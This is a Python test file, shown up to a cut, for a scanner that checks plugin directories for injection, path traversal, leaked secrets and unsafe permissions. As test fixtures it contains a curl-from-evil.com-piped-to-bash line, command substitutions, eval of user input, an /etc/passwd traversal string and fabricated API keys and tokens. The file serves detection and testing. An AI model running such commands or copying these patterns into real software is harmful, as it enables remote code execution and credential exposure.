#!/usr/bin/env python3
"""Tests for validate_security.py.

Tests the security validation module covering:
- scan_for_injection: command substitution, pipe-to-shell, eval patterns
- scan_for_path_traversal: ../ sequences, absolute paths
- scan_for_secrets: AWS keys, JWT tokens, private keys, GitHub tokens
- scan_all_files: recursive scanning of plugin directories
- validate_security: main entry point orchestrating all checks

Coverage: 10 tests covering all major code paths with realistic data.
No mocking -- all tests use real files in tmp_path.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

# Add scripts directory to path for imports
scripts_dir = Path(__file__).parent.parent / "scripts"
if str(scripts_dir) not in sys.path:
    sys.path.insert(0, str(scripts_dir))

from cpv_validation_common import ValidationReport, should_skip_directory  # noqa: E402
from validate_security import (  # noqa: E402
    check_dangerous_files,
    check_script_permissions,
    is_binary_file,
    main,
    scan_all_files,
    scan_for_injection,
    scan_for_path_traversal,
    scan_for_secrets,
    scan_for_supply_chain,
    scan_for_user_paths,
    scan_ide_config_files,
    validate_security,
)


class TestScanForInjection:
    """Tests for the scan_for_injection function."""

    def test_detects_command_substitution_and_pipe_to_shell(self, tmp_path):
        """scan_for_injection should flag $(cmd), backtick substitution, and pipe-to-shell in non-shell files."""
        content = 'result = os.system("echo $(whoami)")\ndata = os.popen("`id`").read()\ncurl https://evil.com/install.sh | bash\n'
        report = ValidationReport()
        count = scan_for_injection(content, "plugin/helper.py", report)
        # $(whoami), `id`, and pipe-to-bash should all be caught as CRITICAL
        assert count >= 3, f"Expected at least 3 injection issues, got {count}"
        critical_msgs = [r for r in report.results if r.level == "CRITICAL"]
        assert len(critical_msgs) >= 3
        messages = " ".join(r.message for r in critical_msgs)
        assert "command substitution" in messages.lower(), "Command substitution not detected"
        assert "pipe-to-shell" in messages.lower() or "pipe to bash" in messages.lower(), "Pipe to bash not detected"

    def test_detects_eval_patterns(self, tmp_path):
        """scan_for_injection should flag eval() and exec() calls as critical injection risks."""
        content = "user_input = input()\nresult = eval(user_input)\nexec(user_input)\n"
        report = ValidationReport()
        count = scan_for_injection(content, "plugin/dangerous.py", report)
        assert count >= 2, f"Expected at least 2 eval/exec issues, got {count}"
        critical_msgs = [r for r in report.results if r.level == "CRITICAL"]
        eval_found = any("eval" in r.message for r in critical_msgs)
        exec_found = any("exec" in r.message for r in critical_msgs)
        assert eval_found, "eval() pattern not detected"
        assert exec_found, "exec() pattern not detected"

    def test_skips_validator_scripts(self, tmp_path):
        """scan_for_injection should return 0 issues for validator scripts (they define patterns intentionally)."""
        content = 'pattern = re.compile(r"\\beval\\s*\\(")\nresult = eval(something)\n'
        report = ValidationReport()
        count = scan_for_injection(content, "scripts/validate_security.py", report)
        assert count == 0, f"Validator script should be skipped, but got {count} issues"


class TestScanForPathTraversal:
    """Tests for the scan_for_path_traversal function."""

    def test_detects_directory_traversal_and_absolute_paths(self, tmp_path):
        """scan_for_path_traversal should flag ../ sequences and absolute system paths."""
        content = (
            'config_path = "../../etc/passwd"\ndata_dir = "/usr/local/secret"\nwin_path = "C:\\Windows\\System32"\n'
        )
        report = ValidationReport()
        count = scan_for_path_traversal(content, "plugin/loader.py", report)
        # Should detect: ../, /usr/local, C:\\ patterns
        assert count >= 2, f"Expected at least 2 path traversal issues, got {count}"
        critical_msgs = [r for r in report.results if r.level == "CRITICAL"]
        assert len(critical_msgs) >= 2


class TestScanForSecrets:
    """Tests for the scan_for_secrets function -- AWS keys, JWT, private keys, GitHub tokens."""

    def test_detects_aws_access_key(self, tmp_path):
        """scan_for_secrets should detect AWS access key IDs matching AKIA pattern."""
        # Use a realistic but non-example AWS key (not in KNOWN_EXAMPLE_SECRETS)
        content = 'aws_key = "AKIA44QH8DHBFAKEKEY1"\n'
        report = ValidationReport()
        count = scan_for_secrets(content, "plugin/config.py", report)
        assert count >= 1, f"Expected AWS key detection, got {count} issues"
        assert any("AWS" in r.message for r in report.results if r.level == "CRITICAL")

    def test_detects_jwt_token(self, tmp_path):
        """scan_for_secrets should detect JWT tokens with base64url-encoded header.payload."""
        # Real JWT structure: base64url(header).base64url(payload).signature
        jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.signature"
        content = f'token = "{jwt}"\n'
        report = ValidationReport()
        count = scan_for_secrets(content, "plugin/auth.py", report)
        assert count >= 1, f"Expected JWT token detection, got {count} issues"
        assert any("JWT" in r.message for r in report.results if r.level == "CRITICAL")

    def test_detects_private_key_and_github_token(self, tmp_path):
        """scan_for_secrets should detect PEM private keys and GitHub PAT tokens."""
        content = (
            "-----BEGIN RSA PRIVATE KEY-----\n"
            "MIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWep4PAtGoL\n"
            "-----END RSA PRIVATE KEY-----\n"
            'GITHUB_TOKEN = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef1234"\n'
        )
        report = ValidationReport()
        count = scan_for_secrets(content, "plugin/deploy.py", report)
        assert count >= 2, f"Expected at least 2 secret detections, got {count}"
        messages = " ".join(r.message for r in report.results)
        assert "Private Key" in messages, "Private key not detected"
        assert "GitHub" in messages, "GitHub token not detected"


class TestScanAllFiles:
    """Tests for scan_all_files which recursively scans a plugin directory."""

    def test_scans_text_files_and_skips_binaries(self, tmp_path):
        """scan_all_files should scan .py/.json text files and skip binary extensions like .png."""
        plugin_dir = tmp_path / "my-plugin"
        plugin_dir.mkdir()

        # Create a text file with an injection pattern
        py_file = plugin_dir / "helper.py"
        py_file.write_text("data = eval(user_input)\n")

        # Create a binary file that should be skipped
        img_file = plugin_dir / "icon.png"
        img_file.write_bytes(b"\x89PNG\r\n\x1a\n" + b"\x00" * 100)

        # Create a clean text file
        readme = plugin_dir / "config.json"
        readme.write_text('{"name": "safe-plugin"}\n')

        report = ValidationReport()
        stats = scan_all_files(plugin_dir, report)

        assert stats["files_scanned"] >= 2, "Should scan at least helper.py and config.json"
        assert stats["files_skipped"] >= 1, "Should skip at least icon.png"
        assert stats["injection_issues"] >= 1, "Should detect eval() in helper.py"


class TestValidateSecurity:
    """Tests for the validate_security main entry point."""

    def test_returns_clean_report_for_safe_plugin(self, tmp_path):
        """validate_security should return a report with no CRITICAL/MAJOR issues for a clean plugin."""
        plugin_dir = tmp_path / "safe-plugin"
        plugin_dir.mkdir()

        # Create minimal safe plugin files
        (plugin_dir / "README.md").write_text("# Safe Plugin\n\nA safe plugin.\n")
        (plugin_dir / "handler.py").write_text(
            '"""Plugin handler."""\n\n\ndef handle(data: dict) -> dict:\n    """Process input data safely."""\n    return {"status": "ok", "count": len(data)}\n'
        )
        manifest_dir = plugin_dir / ".claude-plugin"
        manifest_dir.mkdir()
        (manifest_dir / "plugin.json").write_text(
            json.dumps({"name": "safe-plugin", "version": "1.0.0", "description": "A safe plugin"}, indent=2)
        )

        report = validate_security(plugin_dir)

        critical_issues = [r for r in report.results if r.level == "CRITICAL"]
        major_issues = [r for r in report.results if r.level == "MAJOR"]
        assert len(critical_issues) == 0, f"Expected no CRITICAL issues, got: {[r.message for r in critical_issues]}"
        assert len(major_issues) == 0, f"Expected no MAJOR issues, got: {[r.message for r in major_issues]}"

    def test_reports_critical_for_nonexistent_path(self, tmp_path):
        """validate_security should report CRITICAL when plugin path does not exist."""
        missing = tmp_path / "nonexistent-plugin"
        report = validate_security(missing)
        critical_issues = [r for r in report.results if r.level == "CRITICAL"]
        assert len(critical_issues) >= 1, "Should report CRITICAL for missing path"
        assert any("does not exist" in r.message for r in critical_issues)

    def test_reports_critical_for_file_not_directory(self, tmp_path):
        """validate_security should report CRITICAL when plugin path is a file, not a directory."""
        # Covers lines 528-530: plugin_path.is_dir() returns False
        a_file = tmp_path / "not-a-dir.txt"
        a_file.write_text("I am a file, not a directory")
        report = validate_security(a_file)
        critical_issues = [r for r in report.results if r.level == "CRITICAL"]
        assert len(critical_issues) >= 1, "Should report CRITICAL for non-directory path"
        assert any("not a directory" in r.message for r in critical_issues)


# =====================================================================
# Additional tests targeting uncovered lines (180-181, 188, 195, 260,
# 274-275, 293, 301, 307, 311, 350, 358, 364-369, 384-387, 406-431,
# 441-446, 491-493, 529-530, 570-611, 615)
# =====================================================================


class TestIsBinaryFile:
    """Tests for is_binary_file covering the OSError/PermissionError fallback."""

    def test_unreadable_file_treated_as_binary(self, tmp_path):
        """is_binary_file should return True for files that cannot be read (OSError/PermissionError)."""
        # Covers lines 180-181: except (OSError, PermissionError) -> return True
        unreadable = tmp_path / "locked.dat"
        unreadable.write_text("some content")
        # Remove all read permissions so open() raises PermissionError
        unreadable.chmod(0o000)
        try:
            result = is_binary_file(unreadable)
            assert result is True, "Unreadable file should be treated as binary"
        finally:
            # Restore permissions so tmp_path cleanup works
            unreadable.chmod(0o644)


class TestShouldSkipDirectory:
    """Tests for should_skip_directory covering direct match and wildcard patterns."""

    def test_skips_direct_match_directories(self):
        """should_skip_directory should return True for directories in SKIP_DIRS set."""
        # Covers line 188: direct match returns True
        assert should_skip_directory("__pycache__") is True
        assert should_skip_directory(".git") is True
        assert should_skip_directory("node_modules") is True

    def test_skips_wildcard_egg_info_directories(self):
        """should_skip_directory should match wildcard patterns like *.egg-info."""
        # Covers line 195: wildcard pattern match returns True
        assert should_skip_directory("mypackage.egg-info") is True
        assert should_skip_directory("something.egg-info") is True

    def test_does_not_skip_normal_directories(self):
        """should_skip_directory should return False for normal source directories."""
        assert should_skip_directory("src") is False
        assert should_skip_directory("lib") is False
        assert should_skip_directory("plugins") is False


class TestScanForInjectionUncoveredPaths:
    """Additional injection tests covering markdown-table skip and unsafe variable expansion."""

    def test_skips_pipe_pattern_in_markdown_table_lines(self):
        """scan_for_injection should skip pipe-to-shell false positives in markdown table rows."""
        # Covers line 260: markdown table line with | separators containing "object"/"string"
        # The condition: "|" in line and line.count("|") >= 2 and ("object" in line.lower() or "string" in line.lower())
        content = "| command | string | sh |\n| value | object | bash |\n"
        report = ValidationReport()
        scan_for_injection(content, "plugin/docs/api.md", report)
        # These lines look like markdown tables, not real pipe-to-shell
        pipe_issues = [r for r in report.results if "Pipe to" in r.message]
        assert len(pipe_issues) == 0, (
            f"Markdown table lines should not be flagged as pipe-to-shell: {[r.message for r in pipe_issues]}"
        )

    def test_detects_unsafe_variable_expansion(self):
        """scan_for_injection should flag unquoted variable expansion as MAJOR issue."""
        # Covers lines 274-275: unsafe variable expansion detection
        content = "$USER_INPUT something\n"
        report = ValidationReport()
        scan_for_injection(content, "plugin/script.sh", report)
        major_msgs = [r for r in report.results if r.level == "MAJOR"]
        assert len(major_msgs) >= 1, f"Expected MAJOR issue for unquoted variable, got {len(major_msgs)}"
        assert any("variable" in r.message.lower() for r in major_msgs)


class TestScanForPathTraversalSkips:
    """Tests for scan_for_path_traversal skip conditions and comment/shebang handling."""

    def test_skips_validator_scripts(self):
        """scan_for_path_traversal should return 0 for validator script files."""
        # Covers line 293: is_validator_script returns True -> return 0
        content = 'pattern = re.compile(r"\\.\\./")\npath = "../../etc/passwd"\n'
        report = ValidationReport()
        count = scan_for_path_traversal(content, "scripts/validate_security.py", report)
        assert count == 0, f"Validator scripts should be skipped, got {count} issues"

    def test_skips_test_files(self):
        """scan_for_path_traversal should return 0 for test files containing example data."""
        # Covers line 301: test_ in file_lower -> return 0
        content = 'test_path = "../../etc/passwd"\nassert check(test_path)\n'
        report = ValidationReport()
        count = scan_for_path_traversal(content, "tests/test_paths.py", report)
        assert count == 0, f"Test files should be skipped, got {count} issues"

    def test_skips_comment_lines(self):
        """scan_for_path_traversal should skip lines that are pure comments (not shebangs)."""
        # Covers line 307: stripped.startswith("#") and not "#!" -> continue
        content = '# This references /usr/local/bin for documentation\nactual = "safe"\n'
        report = ValidationReport()
        count = scan_for_path_traversal(content, "plugin/module.py", report)
        assert count == 0, f"Comment lines should be skipped, got {count} issues"

    def test_skips_shebang_lines(self):
        """scan_for_path_traversal should skip shebang lines that legitimately reference system paths."""
        # Covers line 311: stripped.startswith("#!") -> continue
        content = "#!/usr/bin/env python3\nimport safe_module\n"
        report = ValidationReport()
        count = scan_for_path_traversal(content, "plugin/run.py", report)
        assert count == 0, f"Shebang lines should be skipped, got {count} issues"


class TestScanForUserPaths:
    """Tests for scan_for_user_paths covering skips and detection of hardcoded paths."""

    def test_skips_validator_scripts(self):
        """scan_for_user_paths should return 0 for validator scripts."""
        # Covers line 350: is_validator_script -> return 0
        content = 'pattern = re.compile(r"/Users/[^/]+/")\n'
        report = ValidationReport()
        count = scan_for_user_paths(content, "scripts/validate_paths.py", report)
        assert count == 0, f"Validator scripts should be skipped, got {count} issues"

    def test_skips_test_files(self):
        """scan_for_user_paths should return 0 for test files."""
        # Covers line 358: test_ in file_lower -> return 0
        content = 'expected = "/Users/johndoe/projects/app"\n'
        report = ValidationReport()
        count = scan_for_user_paths(content, "tests/test_user_paths.py", report)
        assert count == 0, f"Test files should be skipped, got {count} issues"

    def test_detects_hardcoded_user_path(self):
        """scan_for_user_paths should flag hardcoded /Users/xxx/ paths as MAJOR."""
        # Covers lines 364-369: actual user path detection and report.major
        content = 'DATA_DIR = "/Users/johndoe/projects/my-plugin/data"\nCONFIG = "/home/devuser/config"\n'
        report = ValidationReport()
        count = scan_for_user_paths(content, "plugin/settings.py", report)
        assert count >= 2, f"Expected at least 2 hardcoded user path issues, got {count}"
        major_msgs = [r for r in report.results if r.level == "MAJOR"]
        assert len(major_msgs) >= 2
        messages = " ".join(r.message for r in major_msgs)
        assert "Hardcoded user-home path" in messages or "Hardcoded user path" in messages
        assert "CLAUDE_PLUGIN_ROOT" in messages, "Should suggest using ${CLAUDE_PLUGIN_ROOT}"


class TestCheckDangerousFiles:
    """Tests for check_dangerous_files detecting .env and credential files."""

    def test_detects_env_and_credentials_files(self, tmp_path):
        """check_dangerous_files should flag .env and credentials.json as CRITICAL."""
        # Covers lines 384-387: dangerous file detection loop
        plugin_dir = tmp_path / "evil-plugin"
        plugin_dir.mkdir()
        (plugin_dir / ".env").write_text("SECRET_KEY=supersecret123\n")
        (plugin_dir / "credentials.json").write_text('{"api_key": "leaked"}\n')
        (plugin_dir / "safe_code.py").write_text("print('hello')\n")

        report = ValidationReport()
        count = check_dangerous_files(plugin_dir, report)
        assert count >= 2, f"Expected at least 2 dangerous files, got {count}"
        critical_msgs = [r for r in report.results if r.level == "CRITICAL"]
        assert len(critical_msgs) >= 2
        messages = " ".join(r.message for r in critical_msgs)
        assert ".env" in messages
        assert "credentials.json" in messages


class TestCheckScriptPermissions:
    """Tests for check_script_permissions covering shell and Python script checks."""

    def test_detects_shell_script_issues(self, tmp_path):
        """check_script_permissions should flag non-executable, world-writable, and missing-shebang shell scripts."""
        # Covers lines 406-431: shell script permission checks
        plugin_dir = tmp_path / "plugin-with-scripts"
        plugin_dir.mkdir()

        # Shell script without execute permission and missing shebang
        bad_sh = plugin_dir / "setup.sh"
        bad_sh.write_text("echo 'no shebang here'\nrm -rf /tmp/build\n")
        bad_sh.chmod(0o644)  # Not executable

        # Shell script that is world-writable with a non-standard shebang
        world_writable_sh = plugin_dir / "deploy.sh"
        world_writable_sh.write_text("#!/usr/bin/env python3\nprint('wrong shebang')\n")
        world_writable_sh.chmod(0o777)  # World-writable and executable

        report = ValidationReport()
        count = check_script_permissions(plugin_dir, report)
        # bad_sh: not executable (MINOR) + missing shebang (MINOR) = 2
        # world_writable_sh: world-writable (CRITICAL) + non-standard shebang (INFO) = 1 issue counted
        assert count >= 3, f"Expected at least 3 permission issues, got {count}"
        messages = " ".join(r.message for r in report.results)
        assert "not executable" in messages, "Should detect non-executable shell script"
        assert "world-writable" in messages, "Should detect world-writable script"
        assert "missing shebang" in messages.lower() or "Missing shebang" in messages, "Should detect missing shebang"

    def test_detects_world_writable_python_script(self, tmp_path):
        """check_script_permissions should flag world-writable Python scripts as CRITICAL."""
        # Covers lines 441-446: Python script world-writable check
        plugin_dir = tmp_path / "plugin-with-py"
        plugin_dir.mkdir()

        writable_py = plugin_dir / "handler.py"
        writable_py.write_text('"""Handler module."""\n\ndef handle():\n    pass\n')
        writable_py.chmod(0o666)  # World-writable

        report = ValidationReport()
        count = check_script_permissions(plugin_dir, report)
        assert count >= 1, f"Expected at least 1 permission issue for world-writable .py, got {count}"
        critical_msgs = [r for r in report.results if r.level == "CRITICAL"]
        assert any("world-writable" in r.message.lower() for r in critical_msgs)
        assert any("Python" in r.message for r in critical_msgs)


class TestScanAllFilesUnreadable:
    """Tests for scan_all_files handling unreadable files gracefully."""

    def test_handles_unreadable_text_file(self, tmp_path):
        """scan_all_files should skip unreadable text files and count them as skipped."""
        # Covers lines 491-493: except (OSError, PermissionError) in scan_all_files
        plugin_dir = tmp_path / "plugin-locked"
        plugin_dir.mkdir()

        # Create a text file then remove read permission
        locked_py = plugin_dir / "locked.py"
        locked_py.write_text("eval(something_bad)\n")
        locked_py.chmod(0o000)

        # Create a readable file to ensure scanning works otherwise
        safe_py = plugin_dir / "safe.py"
        safe_py.write_text("print('safe code')\n")

        report = ValidationReport()
        try:
            stats = scan_all_files(plugin_dir, report)
            # locked.py should be skipped (either as binary due to unreadable, or caught by except)
            assert stats["files_scanned"] >= 1, "Should scan at least safe.py"
            assert stats["files_skipped"] >= 1, "Should skip unreadable locked.py"
        finally:
            locked_py.chmod(0o644)


class TestMainCLI:
    """Tests for the main() CLI entry point."""

    def test_main_json_output_for_clean_plugin(self, tmp_path, monkeypatch, capsys):
        """main() with --json flag should output valid JSON with plugin_path for a clean plugin."""
        # Covers lines 570-611: main() parser, --json branch, exit code
        plugin_dir = tmp_path / "cli-plugin"
        plugin_dir.mkdir()
        (plugin_dir / ".claude-plugin").mkdir()
        (plugin_dir / "handler.py").write_text('"""Safe handler."""\n\ndef run():\n    return True\n')

        monkeypatch.setattr("sys.argv", ["validate_security", str(plugin_dir), "--json"])
        exit_code = main()
        captured = capsys.readouterr()
        output = json.loads(captured.out)
        assert "plugin_path" in output, "JSON output should contain plugin_path key"
        assert output["plugin_path"] == str(plugin_dir)
        assert exit_code == 0, f"Expected exit code 0 for clean plugin, got {exit_code}"

    def test_main_strict_mode_returns_nonzero_for_issues(self, tmp_path, monkeypatch, capsys):
        """main() with --strict should return nonzero exit code when issues exist."""
        # Covers lines 609-611: strict mode exit code path
        plugin_dir = tmp_path / "strict-plugin"
        plugin_dir.mkdir()
        (plugin_dir / ".claude-plugin").mkdir()
        # Create a file with a non-example AWS key to trigger CRITICAL
        (plugin_dir / "config.py").write_text('AWS_KEY = "AKIA44QH8DHBFAKEKEY1"\n')

        monkeypatch.setattr("sys.argv", ["validate_security", str(plugin_dir), "--strict", "--json"])
        exit_code = main()
        captured = capsys.readouterr()
        json.loads(captured.out)
        assert exit_code != 0, f"Expected nonzero exit code in strict mode with CRITICAL issues, got {exit_code}"

    def test_main_verbose_text_output(self, tmp_path, monkeypatch, capsys):
        """main() with --verbose should print text output including INFO/PASSED results."""
        # Covers lines 605-607: non-json branch with verbose flag
        plugin_dir = tmp_path / "verbose-plugin"
        plugin_dir.mkdir()
        (plugin_dir / ".claude-plugin").mkdir()
        (plugin_dir / "app.py").write_text('"""Safe app."""\nprint("hello")\n')

        monkeypatch.setattr("sys.argv", ["validate_security", str(plugin_dir), "--verbose"])
        exit_code = main()
        captured = capsys.readouterr()
        assert exit_code == 0
        # Verbose output should contain some text (not JSON)
        assert len(captured.out) > 0, "Verbose mode should produce text output"


# =====================================================================
# IDE Configuration File Secret Scanning (TRDD-8ccb9337)
# =====================================================================
#
# IDE config directories (.vscode, .idea, .cursor, .zed) are hidden and
# scan_all_files skips them because gi.walk() defaults to skip_hidden=True.
# scan_ide_config_files walks them explicitly and reuses the existing
# SECRET_PATTERNS suite via scan_for_secrets.
#
# Fixture plugins live entirely under tmp_path — we never touch real IDE
# configs. Tokens below are fabricated but match the SECRET_PATTERNS regexes.


class TestScanIdeConfigFiles:
    """Tests for scan_ide_config_files — secrets in .vscode/.idea/.cursor/.zed configs."""

    def test_vscode_settings_json_with_openai_key_triggers_critical(self, tmp_path):
        """scan_ide_config_files should flag an OpenAI-style sk- API key in .vscode/settings.json."""
        plugin_dir = tmp_path / "ide-vscode-plugin"
        plugin_dir.mkdir()
        (plugin_dir / ".claude-plugin").mkdir()

        vscode_dir = plugin_dir / ".vscode"
        vscode_dir.mkdir()
        # Valid JSON shape that a user might commit if they forgot to use env vars.
        # The sk- pattern needs >=20 alphanumeric chars after sk- to match.
        settings_json = (
            "{\n"
            '    "terminal.integrated.env.osx": {\n'
            '        "OPENAI_API_KEY": "sk-proj1234567890abcdefghijk"\n'
            "    }\n"
            "}\n"
        )
        (vscode_dir / "settings.json").write_text(settings_json)

        report = ValidationReport()
        stats = scan_ide_config_files(plugin_dir, report)

        assert stats["files_scanned"] == 1, (
            f"Expected to scan exactly .vscode/settings.json, got {stats['files_scanned']}"
        )
        assert stats["secret_issues"] >= 1, f"Expected at least 1 secret finding, got {stats['secret_issues']}"
        critical = [r for r in report.results if r.level == "CRITICAL"]
        assert len(critical) >= 1, "Expected CRITICAL finding for OpenAI key in .vscode/settings.json"
        # The finding must point at the .vscode/settings.json path, not some other file
        assert any(".vscode/settings.json" in (r.file or "") for r in critical), (
            f"CRITICAL finding file_path should mention .vscode/settings.json, got: {[r.file for r in critical]}"
        )

    def test_cursor_mcp_json_with_anthropic_key_triggers_critical(self, tmp_path):
        """scan_ide_config_files should flag an Anthropic sk-ant- key in .cursor/mcp.json."""
        plugin_dir = tmp_path / "ide-cursor-plugin"
        plugin_dir.mkdir()
        (plugin_dir / ".claude-plugin").mkdir()

        cursor_dir = plugin_dir / ".cursor"
        cursor_dir.mkdir()
        # Anthropic pattern requires sk-ant- + 80+ alphanumeric/dash/underscore chars.
        # Construct exactly 80 chars after the prefix.
        fake_ant_key = (
            "sk-ant-api03-"
            "abcdefghijklmnopqrstuvwxyz"
            "0123456789"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "0123456789ab"  # 6 + 26 + 10 + 26 + 12 = 80 chars after sk-ant-
        )
        mcp_json = (
            "{\n"
            '  "mcpServers": {\n'
            '    "anthropic": {\n'
            '      "env": {\n'
            f'        "ANTHROPIC_API_KEY": "{fake_ant_key}"\n'
            "      }\n"
            "    }\n"
            "  }\n"
            "}\n"
        )
        (cursor_dir / "mcp.json").write_text(mcp_json)

        report = ValidationReport()
        stats = scan_ide_config_files(plugin_dir, report)

        assert stats["files_scanned"] == 1, f"Expected to scan exactly .cursor/mcp.json, got {stats['files_scanned']}"
        assert stats["secret_issues"] >= 1, (
            f"Expected at least 1 secret finding in .cursor/mcp.json, got {stats['secret_issues']}"
        )
        critical = [r for r in report.results if r.level == "CRITICAL"]
        assert any(".cursor/mcp.json" in (r.file or "") for r in critical), (
            f"CRITICAL finding should mention .cursor/mcp.json, got: {[r.file for r in critical]}"
        )
        # Specifically the Anthropic pattern should have fired
        assert any("Anthropic" in r.message for r in critical), (
            f"Expected Anthropic API Key detection, got: {[r.message for r in critical]}"
        )

    def test_idea_workspace_xml_with_github_token_triggers_critical(self, tmp_path):
        """scan_ide_config_files should flag a ghp_ GitHub PAT in .idea/workspace.xml."""
        plugin_dir = tmp_path / "ide-idea-plugin"
        plugin_dir.mkdir()
        (plugin_dir / ".claude-plugin").mkdir()

        idea_dir = plugin_dir / ".idea"
        idea_dir.mkdir()
        # JetBrains workspace.xml often stores env vars inline. A ghp_ token with
        # exactly 36 alphanumeric chars matches the SECRET_PATTERNS regex.
        workspace_xml = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<project version="4">\n'
            '  <component name="RunManager">\n'
            '    <configuration name="deploy">\n'
            "      <envs>\n"
            '        <env name="GITHUB_TOKEN" value="ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef1234" />\n'
            "      </envs>\n"
            "    </configuration>\n"
            "  </component>\n"
            "</project>\n"
        )
        (idea_dir / "workspace.xml").write_text(workspace_xml)

        report = ValidationReport()
        stats = scan_ide_config_files(plugin_dir, report)

        # Both the literal path and the .idea/*.xml glob point at workspace.xml,
        # but the seen-set dedupes so it should be scanned exactly once.
        assert stats["files_scanned"] == 1, (
            f"Expected to scan .idea/workspace.xml exactly once (dedupe), got {stats['files_scanned']}"
        )
        assert stats["secret_issues"] >= 1
        critical = [r for r in report.results if r.level == "CRITICAL"]
        assert any("GitHub" in r.message for r in critical), (
            f"Expected GitHub token detection, got: {[r.message for r in critical]}"
        )
        assert any(".idea/workspace.xml" in (r.file or "") for r in critical)

    def test_gitignored_ide_config_is_skipped(self, tmp_path):
        """scan_ide_config_files should skip gitignored IDE config files — they are not shipped."""
        plugin_dir = tmp_path / "ide-gitignored-plugin"
        plugin_dir.mkdir()
        (plugin_dir / ".claude-plugin").mkdir()

        # .gitignore excludes the entire .vscode/ directory — anything inside
        # is local-only and should not be flagged.
        (plugin_dir / ".gitignore").write_text(".vscode/\n")

        vscode_dir = plugin_dir / ".vscode"
        vscode_dir.mkdir()
        # A clearly real-looking token — must still be ignored because of .gitignore.
        (vscode_dir / "settings.json").write_text(
            '{\n  "GITHUB_TOKEN": "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef1234"\n}\n'
        )

        report = ValidationReport()
        stats = scan_ide_config_files(plugin_dir, report)

        assert stats["secret_issues"] == 0, (
            f"Gitignored IDE config should not produce findings, got {stats['secret_issues']}"
        )
        assert stats["files_scanned"] == 0, (
            f"Gitignored file should not be counted as scanned, got {stats['files_scanned']}"
        )
        assert stats["files_skipped"] >= 1, "Gitignored file should be counted as skipped"
        critical = [r for r in report.results if r.level == "CRITICAL"]
        assert not any(".vscode/settings.json" in (r.file or "") for r in critical), (
            "Gitignored .vscode/settings.json should never produce a CRITICAL finding"
        )

    def test_clean_ide_configs_produce_no_findings(self, tmp_path):
        """scan_ide_config_files should report zero issues when IDE configs contain no secrets."""
        plugin_dir = tmp_path / "ide-clean-plugin"
        plugin_dir.mkdir()
        (plugin_dir / ".claude-plugin").mkdir()

        # Populate every supported IDE config path with benign content that
        # references env vars (not literal secrets) — the recommended pattern.
        vscode_dir = plugin_dir / ".vscode"
        vscode_dir.mkdir()
        (vscode_dir / "settings.json").write_text(
            '{\n  "editor.tabSize": 4,\n  "terminal.integrated.env.osx": {\n'
            '    "OPENAI_API_KEY": "${env:OPENAI_API_KEY}"\n  }\n}\n'
        )
        (vscode_dir / "tasks.json").write_text(
            '{\n  "version": "2.0.0",\n  "tasks": [\n    {\n      "label": "run",\n'
            '      "type": "shell",\n      "command": "python main.py"\n    }\n  ]\n}\n'
        )
        (vscode_dir / "launch.json").write_text('{\n  "version": "0.2.0",\n  "configurations": []\n}\n')

        cursor_dir = plugin_dir / ".cursor"
        cursor_dir.mkdir()
        (cursor_dir / "mcp.json").write_text(
            '{\n  "mcpServers": {\n    "local": {\n      "command": "node",\n'
            '      "args": ["server.js"]\n    }\n  }\n}\n'
        )
        (cursor_dir / "settings.json").write_text('{\n  "theme": "dark"\n}\n')

        zed_dir = plugin_dir / ".zed"
        zed_dir.mkdir()
        (zed_dir / "settings.json").write_text('{\n  "theme": "One Dark"\n}\n')
        (zed_dir / "tasks.json").write_text('[\n  {"label": "build", "command": "make"}\n]\n')

        report = ValidationReport()
        stats = scan_ide_config_files(plugin_dir, report)

        # At least the 7 files we wrote should be scanned (no .idea/ in this fixture).
        assert stats["files_scanned"] == 7, f"Expected to scan exactly 7 IDE config files, got {stats['files_scanned']}"
        assert stats["secret_issues"] == 0, (
            f"Clean IDE configs should produce zero secret findings, got {stats['secret_issues']}. "
            f"Unexpected findings: {[r.message for r in report.results if r.level == 'CRITICAL']}"
        )
        critical = [r for r in report.results if r.level == "CRITICAL"]
        assert len(critical) == 0, (
            f"Clean IDE configs should produce zero CRITICAL findings, got: {[r.message for r in critical]}"
        )

    def test_validate_security_integration_flags_vscode_secret(self, tmp_path):
        """validate_security full pipeline should catch a secret in .vscode/settings.json end-to-end."""
        plugin_dir = tmp_path / "ide-integration-plugin"
        plugin_dir.mkdir()
        (plugin_dir / ".claude-plugin").mkdir()
        # Minimal valid plugin manifest so validate_security proceeds normally.
        (plugin_dir / ".claude-plugin" / "plugin.json").write_text(
            json.dumps({"name": "ide-test", "version": "1.0.0", "description": "x"})
        )

        vscode_dir = plugin_dir / ".vscode"
        vscode_dir.mkdir()
        # Use an AWS access key — unambiguous CRITICAL regex with no false positives
        # against clean code, and not in KNOWN_EXAMPLE_SECRETS.
        (vscode_dir / "settings.json").write_text(
            '{\n  "terminal.integrated.env.osx": {\n    "AWS_ACCESS_KEY_ID": "AKIA44QH8DHBFAKEKEY1"\n  }\n}\n'
        )

        report = validate_security(plugin_dir)

        critical = [r for r in report.results if r.level == "CRITICAL"]
        assert any(".vscode/settings.json" in (r.file or "") for r in critical), (
            f"validate_security should surface the AWS key in .vscode/settings.json as CRITICAL. "
            f"All CRITICAL findings: {[(r.message, r.file) for r in critical]}"
        )


class TestFalsePositiveReduction:
    """Negative tests covering the three FP classes fixed in v2.24.0.

    Each fix has TWO assertions: the FP must NOT fire on the benign form,
    AND the original threat must STILL fire on the malicious form. Without
    the second assertion an FP fix can silently weaken detection.
    """

    # ----- /tmp / /var FP in absolute-path rule ---------------------------

    def test_tmp_path_in_mktemp_is_not_critical(self, tmp_path):
        """`mktemp /tmp/foo.XXXXXX` is the canonical POSIX temp idiom, not an exploit."""
        content = (
            'CODEFILE="$(mktemp /tmp/ai-review-code.XXXXXX)"\n'
            'OUTFILE="$(mktemp /tmp/ai-review-out.XXXXXX)"\n'
            'echo "scratch" > /tmp/scratch.log\n'
        )
        report = ValidationReport()
        scan_for_path_traversal(content, "plugin/runner.sh", report)
        tmp_findings = [r for r in report.results if "/tmp/" in r.message or "tmp" in r.message.lower()]
        assert tmp_findings == [], (
